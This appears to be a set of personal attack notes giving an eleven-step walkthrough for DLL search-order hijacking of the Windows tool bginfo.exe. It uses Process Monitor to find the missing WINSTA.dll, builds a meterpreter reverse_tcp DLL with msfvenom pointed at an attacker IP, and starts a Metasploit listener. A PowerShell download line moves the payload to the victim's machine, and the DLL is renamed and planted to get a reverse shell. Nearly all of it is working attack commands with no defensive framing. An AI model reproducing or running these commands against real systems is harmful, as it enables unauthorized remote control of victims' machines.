1. Download process monitor and bginfo
2. use procmon.exe to monitor running processes
3. Filter the results - process name=bginfo.exe, result is NAME NOT FOUND, PATH ENDS WITH DLL
4. Execute bginfo.exe
5. find WINSTA.dll and see where the executable looks for it
6. Build a malicious dll using msfvenom - msfvenom -p windows/meterpreter/reverse_tcp lhost=[attackers ip] lport=4444 -f dll -o mal.dll
7. Start a listener using msfconsole:
	use exploit/multi/handler
	set payload windows/meterpreter/reverse_tcp
	set lhost eth0
	set lport 4444
	exploit
8. Upload the generated dll to the victim's machine:
	attacker - python3 -m http.server
	victim -  (New-Object Net.webclient).DownloadFile(['url/file'],'path')
9. Put the dll in a directory that is part of the default search folder
10. Rename the malicious DLL to the vulnerable dll
11. Execute the program to get a reverse shell